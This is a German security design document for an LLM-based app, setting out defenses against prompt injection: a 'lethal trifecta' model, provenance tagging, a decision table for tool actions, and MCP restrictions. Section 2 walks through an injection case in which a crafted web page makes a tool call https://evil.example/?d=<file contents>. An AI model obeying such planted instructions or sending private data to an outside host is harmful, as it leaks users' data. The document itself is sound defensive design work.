# Sicherheitskonzept: Prompt Injection

_Status: **aus dem Implementierungsplan abgeleitet**, weil das Original beim Start nicht vorlag (02.11.2026 referenziert, 04.11.2026 geschrieben). Bitte gegen das Original prüfen und bei Abweichungen ersetzen; der Code folgt dann dem Original. Die Abschnittsnummern entsprechen den Verweisen im Plan._

## 1. Bedrohung

Ein Sprachmodell kann Anweisungen und Daten nicht zuverlässig trennen. Jeder Text, den es liest (Webseite, PDF, importierte Quelle, Skill, Dokument von anderen), kann es steuern. Filter helfen nicht zuverlässig. Deshalb entsteht Schutz durch **Regeln im Code**, die unabhängig davon greifen, was das Modell „will“.

## 2. Das tödliche Dreieck

Schaden entsteht erst, wenn ein Lauf **alle drei** hat:

- **A – Fremdes:** Er hat Inhalte gelesen, die nicht vom Nutzer stammen.
- **B – Sensibles:** Er hat private Daten gelesen (Persona-Dateien, Gedächtnis).
- **C – Wirkung:** Er kann nach außen senden oder Daten zerstören.

Beispiel von heute (behoben in Phase S): Ein Chat mit Persona-Dateien und Websuche liest eine präparierte Seite, und `open_page` ruft `https://evil.example/?d=<Dateiinhalt>` auf.

## 3. Grundsätze

1. Die Registry entscheidet, nicht das Modell und nicht der Prompt.
2. Jede Action deklariert `readsUntrusted` (A), `sensitive` (B) und `effect` (C). Ohne diese Angaben lässt sie sich nicht registrieren.
3. API-Schlüssel erscheinen nie in Ergebnissen, Protokoll oder Fehlermeldungen.
4. Keine Netzwerkports. Nur ein Unix-Socket, Rechte 0600, Peer-UID-Prüfung, Token.

## 4. Regeln

### 4.1 Herkunft

Dokumente haben eine Herkunft: `eigen` (vom Nutzer), `intern` (von der App oder einem lokalen Modell ohne fremde Eingaben erzeugt), `fremd` (Web, Import, MCP-Client, Lauf mit A).

- **Lesen** eines `fremd`-Inhalts setzt A im Lauf.
- **Schreiben** aus einem Lauf mit A markiert das Ziel als `fremd` (Ansteckung).
- **„Als geprüft bestätigen“** geht nur einzeln durch den Menschen (Kanal `ui` oder Freigabedialog), nie pauschal je Quelle.
- Gespeichert wird die Herkunft im YAML-Kopf des Dokuments (`herkunft:`). Fehlt sie, gilt `eigen`: Bestehende Dokumente stammen vom Nutzer. Eine Herkunft je Block ist vorgesehen, aber flüchtig: Die Ansteckung wirkt derzeit je Dokument, was strenger ist.

### 4.2 Entscheidungsregel („Rule of Two“)

Ein Lauf hat einen Zustand aus A und B. Für eine Action gilt:

- `A' = Lauf.A ∨ Kanal ist MCP ∨ Action.readsUntrusted`
- `B' = Lauf.B ∨ Action.sensitive`
- `C = effect ∈ {outbound, destructive}`

Die Regeln gelten in dieser Reihenfolge, die erste passende entscheidet:

| # | Bedingung | Entscheidung |
|---|---|---|
| 1 | Kanal `ui` | erlauben |
| 2 | Kanal `mcp` und `Action.sensitive` | **verweigern** |
| 3 | `A' ∧ B' ∧ C` | fragen (Dreieck) |
| 4 | `effect = outbound ∧ (A' ∨ B')` | fragen |
| 5 | `effect = destructive ∧ A'` | fragen |
| 6 | `Action.sensitive ∧ A'` | fragen (Dreieck würde sich schließen) |
| 7 | sonst | Freigabestufe aus Kanal × Art |

Freigabestufen (änderbar, außer dass Art D nie ohne Prüfung läuft):

| Kanal | lesen | schreiben | destruktiv |
|---|---|---|---|
| `ui` | erlauben | erlauben | erlauben |
| `cli` | erlauben | erlauben | fragen |
| `mcp` | erlauben | erlauben | fragen |
| `chat` | erlauben | fragen | fragen |

Ist kein Mensch erreichbar (Dialog nicht möglich), bedeutet „fragen“ **verweigern**. Der Dialog zeigt Action, Ziel, gekürzte Daten und den **Grund**.

### 4.3 Läufe

Ein Lauf ist eine Folge zusammengehöriger Actions mit gemeinsamem A/B-Zustand: `--run <id>` bzw. `LLMD_RUN` im Terminal, eine `llmd mcp`-Sitzung, ein Chat. Ohne Kennung ist jeder Aufruf ein eigener Lauf.

### 4.4 Fremdes im internen Chat

Ergebnisse mit fremden Inhalten kommen eingerahmt mit zufälliger Kennung zum Modell (`<fremd-a1b2c3>…</fremd-a1b2c3>`). Das ist nur eine Hilfe, kein Schutz; den Schutz leistet 4.2. Der Chat darf sich nicht selbst Nachrichten schicken (Rekursionsschutz).

## 5. MCP

- Der MCP-Client gilt als `fremd`: A ist immer gesetzt.
- Sensible Gruppen (B: `memory.*`, `persona.files.*`) sind gesperrt.
- `outbound` nur nach Freigabe.

## 6. Angriffssammlung

`Tests/LLMDesignerTests/Security/` enthält präparierte Webseiten, PDFs, Dokumente und Skills mit eingebetteten Anweisungen sowie Szenariotests. Ziel: 0 erfolgreiche A+B+C-Abflüsse, geblockt **von der Registry**.

## 7. Ausgangskontrolle

Export schreibt ohne Rückfrage nur in den Exportordner. Andere Pfade brauchen eine Freigabe. Web-Ansichten (Folien-Designs, Mermaid) laden keine externen Ressourcen (`WKContentRuleList`).
